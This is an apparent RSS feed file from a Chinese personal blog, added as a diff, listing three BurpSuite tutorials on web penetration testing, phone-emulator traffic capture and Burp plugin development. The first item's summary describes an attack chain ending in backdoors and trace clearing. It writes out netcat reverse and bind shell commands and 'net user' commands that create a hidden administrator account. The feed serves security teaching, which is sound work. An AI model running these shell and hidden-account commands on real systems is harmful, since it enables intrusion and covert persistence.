@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>burpsuite :: liaomin416100569博客</title>
+    <link>https://jiaozi789.github.io/docs/security/burp_suite/index.html</link>
+    <description></description>
+    <generator>Hugo</generator>
+    <language>zh</language>
+    <lastBuildDate>Thu, 18 Sep 2025 16:55:17 +0800</lastBuildDate>
+    <atom:link href="https://jiaozi789.github.io/docs/security/burp_suite/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BurpSuite实战教程01-web渗透安全测试(靶场搭建及常见漏洞攻防)</title>
+      <link>https://jiaozi789.github.io/docs/security/burp_suite/action_01_web/index.html</link>
+      <pubDate>Thu, 18 Sep 2025 16:55:17 +0800</pubDate>
+      <guid>https://jiaozi789.github.io/docs/security/burp_suite/action_01_web/index.html</guid>
+      <description>渗透测试 渗透测试（Penetration test）即安全工程师模拟黑客，在合法授权范围内，通过信息搜集、漏洞挖掘、权限提升等行为，对目标对象进行安全测试（或攻击），最终找出安全风险并输出测试报告。&#xA;Web渗透测试分为白盒测试和黑盒测试，白盒测试是指目标网站的源码等信息的情况下对其渗透，相当于代码分析审计。而黑盒测试则是在对该网站系统信息不知情的情况下渗透。&#xA;Web渗透分为以下几个步骤，信息收集，漏洞扫描，漏洞利用，提权，内网渗透，留后门，清理痕迹。一般的渗透思路就是看是否有注入漏洞，然后注入得到后台管理员账号密码，登录后台，上传小马，再通过小马上传大马，提权，内网转发，进行内网渗透，扫描内网c段存活主机及开放端口，看其主机有无可利用漏洞（nessus）端口（nmap）对应服务及可能存在的漏洞，对其利用（msf）拿下内网，留下后门，清理痕迹。或者看是否有上传文件的地方，上传一句话木马，再用菜刀链接，拿到数据库并可执行cmd命令，可继续上大马………思路很多，很多时候成不成功可能就是一个思路的问题，技术可以不高，思路一定得骚。&#xA;信息收集 息收集是整个流程的重中之重，前期信息收集的越多，Web渗透的成功率就越高。&#xA;DNS域名信息：通过url获取其真实ip,子域名(Layer子域名爆破机)，旁站(K8旁站，御剑1.5)，c段，网站负责人及其信息（whois查询） 整站信息：服务器操作系统、服务器类型及版本(Apache/Nginx/Tomcat/IIS)、数据库类型(Mysql/Oracle/Accees/Mqlserver)、脚本类型(php/jsp/asp/aspx)、CMS类型； 网站常见搭配为： ASP和ASPX：ACCESS、SQLServer PHP：MySQL、PostgreSQL JSP：Oracle、MySQL 敏感目录信息（御剑，dirbust） 开放端口信息（nmp） 漏洞扫描 利用AWVS,AppScan,OWASP-ZAP，BurpSuite等可对网站进行网站漏洞的初步扫描，看其是否有可利用漏洞。 常见漏洞：&#xA;SQL注入 XSS跨站脚本 CSRF跨站请求伪造 XXE(XML外部实体注入)漏洞 SSRF(服务端请求伪造)漏洞 文件包含漏洞 文件上传漏洞 文件解析漏洞 远程代码执行漏洞 CORS跨域资源共享漏洞 越权访问漏洞 目录遍历漏洞和任意文件读取/下载漏洞 漏洞利用 用工具也好什么也好对相应漏洞进行利用 如： Sql注入（sqlmap） XSS（BEEF） 后台密码爆破（burp） 端口爆破（hydra）&#xA;提权 获得shell之后我们权限可能很低，因此要对自己提权，可以根据服务器版本对应的exp进行提权，对于Windows系统也可看其补丁对应漏洞的exp进行提权&#xA;内网渗透 首先进行端口转发可用nc nc使用方法： 反向连接 在公网主机上进行监听： nc-lvp 4444 在内网主机上执行： nc-e cmd.exe 公网主机ip4444 成功之后即可得到一个内网主机shell 正向连接 远程主机上执行： nc-l -p 4444 -t -e cmd.exe 本地主机上执行： nc-vv 远程主机ip4444 成功后，本地主机即可远程主机的一个shell 然后就是对内网进行渗透了，可以用主机漏洞扫描工具（nessus,x-scan等）进行扫描看是否有可用漏洞，可用msf进行利用，或者用nmap扫描存活主机及开放端口，可用hydra进行端口爆破或者用msf对端口对应漏洞得到shell拿下内网留后门&#xA;留后门 对于网站上传一句话木马，留下后门 对于windows用户可用hideadmin创建一个超级隐藏账户 手工： netuser test$ 123456 /add netlocalgroup administrators test$ /add 这样的话在cmd命令中看不到，但在控制面板可以看到，还需要改注册表才能实现控制版面也看不到。</description>
+    </item>
+    <item>
+      <title>BurpSuite实战教程02-BurpSuite&#43;夜神模拟器抓包教程</title>
+      <link>https://jiaozi789.github.io/docs/security/burp_suite/action_02_fpackage/index.html</link>
+      <pubDate>Thu, 18 Sep 2025 16:55:17 +0800</pubDate>
+      <guid>https://jiaozi789.github.io/docs/security/burp_suite/action_02_fpackage/index.html</guid>
+      <description>工具介绍 BurpSuite BurpSuite是用于“攻击”web 应用程序的集成平台（java编写），包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。&#xA;BurpSuite简单易懂，使用方便，而且支持插件拓展，是系统安全工程师必备的工具，在国内应用广泛，文档和教程齐全，可在bilibili上找到各式各样的学习视频学习。&#xA;结合web渗透靶场使用bp参考：https://blog.csdn.net/liaomin416100569/article/details/128200652?spm=1001.2014.3001.5501&#xA;burp绿色免装jdk版 百度网盘：链接：https://pan.baidu.com/s/1y7KuzSg_SKmtEP4OTRycwg?pwd=52pj 提取码：52pj&#xA;夜神模拟器 夜神安卓模拟器 ，电脑玩手游的新一代神器，夜神安卓模拟器 是一款采用类手机界面视觉设计的PC端桌面软件，采用内核技术（基于Android7.0 [3] 版本内核针在电脑上运行深度开发），具有同类模拟器中领先运行速度和稳定的性能。 夜神安卓模拟器是一个可以让手机应用程序运行在电脑上的软件 ，由夜神团队于2015年6月份推出。&#xA;夜神模拟器也是进行web抓包，爬虫的必备工具，随着微信小程序的普及，应用反编译成本代价越来越高，同时程序开始偏向于前后端分离，通过手机模拟器设置代理抓取数据的需求越来越高。&#xA;夜神模拟器相对于官方模拟器来说安装简单，拓展性强。 官方文档：https://www.yeshen.com/ 其他可替代类似模拟器：&#xA;MuMu模拟器，网易出品的模拟器，比夜神模拟器更加清爽，https://mumu.163.com/。 逍遥模拟器，百度出品 https://www.xyaz.cn/。 雷电模拟器：https://www.ldmnq.com/ 微信小程序抓包 本内容仅用于学习目的,文章参考自官网：Configuring an Android device to work with Burp Suite Professional 。&#xA;设置代理服务器 打开burpsuite，创建一个临时项目（这里主要为了演示，也可以保存到磁盘） 开启burpsuite ，打开页签：proxy-options 新增一个proxy listeners,设置需要代理的端口，一个四位数就可以，bind to address选择你宿主机物理网卡的ip地址（打开cmd，ipconfig查看） 访问：http://192.168.20.48:8899,出现该页面就表示成功 点击右侧的CA Certificate下载根证书本地备份。</description>
+    </item>
+    <item>
+      <title>BurpSuite实战教程03-BurpSuite插件开发</title>
+      <link>https://jiaozi789.github.io/docs/security/burp_suite/action_03_plugins/index.html</link>
+      <pubDate>Thu, 18 Sep 2025 16:55:17 +0800</pubDate>
+      <guid>https://jiaozi789.github.io/docs/security/burp_suite/action_03_plugins/index.html</guid>
+      <description>burp插件开发 Burp Suite的强大除了自身提供了丰富的可供测试人员使用的功能外，其提供的支持第三方拓展插件的功能也极大地方便使用者编写自己的自定义插件。，Burp Suite支持的插件类型有Java、Python、Ruby三种。无论哪种语言的实现，开发者只要选择自己熟悉的语言，按照接口规范去实现想要的功能即可。下面我们就来看看如何开发一个Burp Extender的插件。 本章讲述的主要内容有：&#xA;API描述 Burp插件的编写前准备 Burp插件的编写（Java语言版） api描述 打开Burp Extender的APIs的Tab页，看到的界面如下图所示： 注意不同版本的api可能不一样，我之前按照官网最新的使用maven依赖的方式，就因为BurpExtension最新版本使用初始化方法initalize和我当前版本的initalise差一个字母，导致折腾了半天，建议开发使用当前文件的api接口导出到项目源代码目录，因为maven的api压根不知道版本对应关系，我的版本:V2022.9。&#xA;在idea中新建一个maven空项目，点击apis - save interface files到src/main/java目录 目录结构如下 具体api的用途请参考api的描述或者在apis面板上save javadoc files打开html查看 或者进入官网查看： https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/MontoyaApi.html&#xA;插件编写前准备 源代码参考 burpsuite没有详细文档描述插件如何编写，提供了很多相关的案例，需要自行阅读 https://github.com/PortSwigger/burp-extensions-montoya-api-examples&#xA;java环境配置 首先确定你burpsuite版本需要使用的jdk，比如我的是jdk17，平时开发都使用的jdk8 修改idea的环境 点击project structure - SDKS新增jdk17 Modules上的language level如果没有17就选最大就行，我这里是13就可以了，这只是idea编译代码用到的版本 Project上的Project SDK换成17即可 pom.xml中添加</description>
+    </item>
+  </channel>
+</rss>
